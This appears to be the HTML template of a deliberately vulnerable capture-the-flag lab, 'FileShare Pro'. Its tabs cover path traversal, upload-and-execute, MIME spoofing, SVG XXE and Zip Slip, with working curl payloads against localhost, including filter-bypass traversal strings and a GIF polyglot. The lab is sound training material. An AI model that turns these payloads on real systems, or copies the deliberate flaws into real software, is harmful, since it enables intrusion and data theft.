@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FileShare Pro - Secure Enterprise File Portal</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+  <header>
+    <a href="/" class="brand">
+      <span class="brand-icon">📁</span>
+      <span>FileShare Pro</span>
+    </a>
+
+    <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
+      <div class="diff-selector">
+        <span style="font-size: 0.8rem; color: var(--text-muted); padding-left: 0.5rem;">Mode:</span>
+        <span class="diff-badge diff-{{ difficulty }}">{{ difficulty | upper }}</span>
+        <button class="diff-btn {% if difficulty == 'easy' %}active{% endif %}" onclick="setDifficulty('easy')">Easy</button>
+        <button class="diff-btn {% if difficulty == 'medium' %}active{% endif %}" onclick="setDifficulty('medium')">Medium</button>
+        <button class="diff-btn {% if difficulty == 'hard' %}active{% endif %}" onclick="setDifficulty('hard')">Hard</button>
+      </div>
+
+      <button id="reset-btn" class="btn btn-outline btn-sm">Reset Files</button>
+    </div>
+  </header>
+
+  <main>
+    <div class="alert alert-info">
+      <strong>Active Defense Mode: {{ difficulty | upper }}</strong>
+      {% if difficulty == 'easy' %}
+        — Path traversal filters disabled. Scripts allowed directly. MIME verification checks client Content-Type header only.
+      {% elif difficulty == 'medium' %}
+        — Single-pass <code>../</code> stripping active. Script extension blacklist (.py, .sh) enabled. Image magic bytes verification enforced.
+      {% else %}
+        — Recursive traversal filter & path prefix restriction. Strict whitelist for uploads (plugins directory isolated). Advanced XML parser for SVG assets.
+      {% endif %}
+    </div>
+
+    <div class="nav-tabs">
+      <button class="tab-btn active" data-tab="tab-files" onclick="switchTab('tab-files')">
+        <span>📂</span> File Explorer
+      </button>
+      <button class="tab-btn" data-tab="tab-media" onclick="switchTab('tab-media')">
+        <span>🖼️</span> Media & Avatar Gallery
+      </button>
+      <button class="tab-btn" data-tab="tab-plugins" onclick="switchTab('tab-plugins')">
+        <span>⚙️</span> Plugins & Automations
+      </button>
+      <button class="tab-btn" data-tab="tab-api" onclick="switchTab('tab-api')">
+        <span>⚡</span> API & CTF Console
+      </button>
+    </div>
+
+    <!-- TAB 1: FILE EXPLORER -->
+    <div id="tab-files" class="tab-content active">
+      <div class="grid-2">
+        <div class="card">
+          <div class="card-title">
+            <span>Stored Files</span>
+            <span style="font-size: 0.8rem; color: var(--text-muted);">{{ files|length }} files</span>
+          </div>
+
+          <table class="file-table">
+            <thead>
+              <tr>
+                <th>Filename</th>
+                <th>Size</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for f in files %}
+              <tr>
+                <td>
+                  <strong>{{ f.name }}</strong>
+                </td>
+                <td style="color: var(--text-muted);">{{ f.size }} B</td>
+                <td>
+                  <div style="display: flex; gap: 0.4rem; flex-wrap: wrap;">
+                    <a href="/api/download?file={{ f.name }}" class="btn btn-outline btn-sm" download>Download</a>
+                    <button class="btn btn-outline btn-sm" onclick="previewFile('{{ f.name }}')">Preview</button>
+                    {% if f.is_script %}
+                    <button class="btn btn-primary btn-sm" onclick="executeScript('{{ f.name }}')">Run</button>
+                    {% endif %}
+                  </div>
+                </td>
+              </tr>
+              {% else %}
+              <tr>
+                <td colspan="3" style="text-align: center; color: var(--text-muted); padding: 2rem;">No files uploaded yet.</td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+
+          <div id="execution-console" class="console-box" style="margin-top: 1.5rem;">[Execution Output Console] Ready.</div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Upload File</div>
+          <form id="upload-form">
+            <div style="margin-bottom: 1.25rem;">
+              <label style="display: block; font-size: 0.85rem; color: var(--text-muted); margin-bottom: 0.5rem;">Select file to upload:</label>
+              <input type="file" id="file-input" name="file" class="upload-zone" style="width: 100%; display: block;" required>
+            </div>
+            <button type="submit" class="btn btn-primary" style="width: 100%; justify-content: center;">Upload to Storage</button>
+          </form>
+          <div id="upload-status" class="console-box" style="margin-top: 1.25rem;">[Upload Status] Awaiting submission...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 2: MEDIA GALLERY -->
+    <div id="tab-media" class="tab-content">
+      <div class="grid-2">
+        <div class="card">
+          <div class="card-title">Upload Profile Avatar or Graphic</div>
+          <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1rem;">
+            Images uploaded here undergo strict MIME validation depending on the active security tier.
+          </p>
+          <form id="media-form">
+            <div style="margin-bottom: 1.25rem;">
+              <label style="display: block; font-size: 0.85rem; color: var(--text-muted); margin-bottom: 0.5rem;">Choose image file (.png, .jpg, .gif, .svg):</label>
+              <input type="file" id="media-input" name="file" class="upload-zone" style="width: 100%; display: block;" required>
+            </div>
+            <button type="submit" class="btn btn-primary" style="width: 100%; justify-content: center;">Upload & Validate Media</button>
+          </form>
+          <div id="media-status" class="console-box" style="margin-top: 1.25rem;">[Media Validator Status] Ready.</div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Validation Policy Overview</div>
+          <ul style="padding-left: 1.25rem; font-size: 0.88rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 0.75rem;">
+            <li><strong>Easy:</strong> Relies solely on client HTTP header <code>Content-Type: image/png</code>. Spoofable via curl!</li>
+            <li><strong>Medium:</strong> Validates first magic bytes (PNG, GIF89a, JPEG) but permits embedded script bodies.</li>
+            <li><strong>Hard:</strong> Processes vector SVG files using an XML rendering parser with entity resolution enabled.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 3: PLUGINS -->
+    <div id="tab-plugins" class="tab-content">
+      <div class="grid-2">
+        <div class="card">
+          <div class="card-title">Active Plugins</div>
+          <table class="file-table">
+            <thead>
+              <tr>
+                <th>Plugin Script</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for p in plugins %}
+              <tr>
+                <td><code>{{ p.name }}</code></td>
+                <td>
+                  <button class="btn btn-primary btn-sm" onclick="runPlugin('{{ p.name }}')">Execute</button>
+                </td>
+              </tr>
+              {% else %}
+              <tr>
+                <td colspan="2" style="text-align: center; color: var(--text-muted);">No plugins registered.</td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+          <div id="plugin-console" class="console-box" style="margin-top: 1.5rem;">[Plugin Output Console] Ready.</div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Plugin Architecture</div>
+          <p style="font-size: 0.88rem; color: var(--text-muted); margin-bottom: 1rem;">
+            Plugins live in <code>/app/plugins/</code> and execute with server environment privileges.
+            In Hard mode, you can deliver plugins via path traversal filenames (<code>../../plugins/exploit.py</code>) or Zip Slip archives.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 4: API & CTF CONSOLE -->
+    <div id="tab-api" class="tab-content">
+      <div class="card">
+        <div class="card-title">Challenge Testing Console & Curl Snippets</div>
+        <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.5rem;">
+          Use these commands to test each challenge directly against the active mode:
+        </p>
+
+        <h3 style="font-size: 1rem; margin-bottom: 0.5rem; color: var(--primary);">1. Path Traversal</h3>
+        <div class="curl-snippet"># Easy Mode Traversal:
+curl -s "http://127.0.0.1:8003/api/download?file=../../../../app/flag_traversal.txt"
+
+# Medium Mode Traversal (Bypass single-pass strip):
+curl -s "http://127.0.0.1:8003/api/download?file=....//....//app/flag_traversal.txt"
+
+# Hard Mode Traversal (Prefix / Double-Encoding bypass):
+curl -s "http://127.0.0.1:8003/api/download?file=uploads/../../app/flag_traversal.txt"</div>
+
+        <h3 style="font-size: 1rem; margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--primary);">2. Unrestricted File Upload</h3>
+        <div class="curl-snippet"># Easy Mode Upload & Execute:
+curl -F "file=@exploit.py" http://127.0.0.1:8003/api/upload
+curl -X POST -H "Content-Type: application/json" -d '{"file": "exploit.py"}' http://127.0.0.1:8003/api/execute
+
+# Medium Mode Upload (Uppercase / Alternate Extension Bypass):
+curl -F "file=@exploit.PY" http://127.0.0.1:8003/api/upload
+curl -X POST -H "Content-Type: application/json" -d '{"file": "exploit.PY"}' http://127.0.0.1:8003/api/execute
+
+# Hard Mode Upload (Plugin Traversal or Zip Slip):
+curl -F "file=@exploit.py;filename=../../plugins/test_plugin.py" http://127.0.0.1:8003/api/upload
+curl -X POST -H "Content-Type: application/json" -d '{"plugin": "test_plugin.py"}' http://127.0.0.1:8003/api/plugins/run</div>
+
+        <h3 style="font-size: 1rem; margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--primary);">3. Weak MIME Validation</h3>
+        <div class="curl-snippet"># Easy Mode (Header Spoofing):
+curl -F "file=@exploit.txt;type=image/png" http://127.0.0.1:8003/api/upload/image
+
+# Medium Mode (Magic Byte Polyglot):
+printf 'GIF89a; import os; print(os.environ.get("FLAG_FILE_SHARE_MIME_MEDIUM"))' > polyglot.gif
+curl -F "file=@polyglot.gif;type=image/gif" http://127.0.0.1:8003/api/upload/image
+
+# Hard Mode (SVG XXE):
+curl -F "file=@payload.svg;type=image/svg+xml" http://127.0.0.1:8003/api/upload/image</div>
+      </div>
+    </div>
+  </main>
+
+  <!-- PREVIEW MODAL -->
+  <div id="preview-modal" class="modal-backdrop">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 id="modal-file-title" style="font-size: 1rem;">File Preview</h3>
+        <button class="btn btn-outline btn-sm" onclick="closeModal()">✕</button>
+      </div>
+      <div class="modal-body">
+        <pre id="modal-file-content" style="font-family: monospace; font-size: 0.85rem; color: #38bdf8; white-space: pre-wrap; word-break: break-all;"></pre>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>VulnLab CTF — FileShare Pro | Port 8003 | Educational Security Testing Sandbox</p>
+  </footer>
+
+  <script src="/static/js/app.js"></script>
+</body>
+</html>
